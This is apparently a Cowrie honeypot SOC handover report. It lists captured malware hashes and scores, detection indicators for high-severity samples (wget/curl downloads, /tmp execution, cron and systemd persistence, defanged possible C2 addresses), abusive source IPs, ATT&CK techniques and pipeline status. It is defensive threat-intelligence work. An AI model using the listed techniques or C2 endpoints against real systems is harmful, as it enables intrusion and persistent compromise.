| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.48.176[.]103` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 15 |
| `159.223.98[.]198` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `64.62.197[.]32` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `129.121.142[.]45` | US | Oso Grande IP Services, LLC | **100** ⚠️ | 8 |
| `109.105.209[.]9` | US | ICG-ZEN-LAX-1 | **100** ⚠️ | 50 |
| `85.50.121[.]120` | ES | Orange Espagne SA | **100** ⚠️ | 4 |
| `46.98.61[.]20` | UA | FREGAT | **100** ⚠️ | 3 |
| `138.68.103[.]218` | DE | DigitalOcean, LLC | **100** ⚠️ | 4 |
| `121.152.123[.]106` | KR | Korea Telecom | **100** ⚠️ | 28 |
| `212.70.109[.]160` | QA | Vodafone Qatar P.Q.S.C | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 290 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 226 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 81 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 81 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 15 |

---

## 🔕 False Positive Summary (73 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 21 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 3 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 36 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 472 cases |
| Tool 34  | Credential Extractor        | ✅ 3654 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 33 fingerprints |
| Tool 36  | Command Clustering          | ✅ 21 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 291 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 73 filtered (15.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 131 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 34 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 222 priority case(s) shown individually · 159 recon entry/entries in table (12 group(s) consolidating 30 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-19T17:58:29Z_
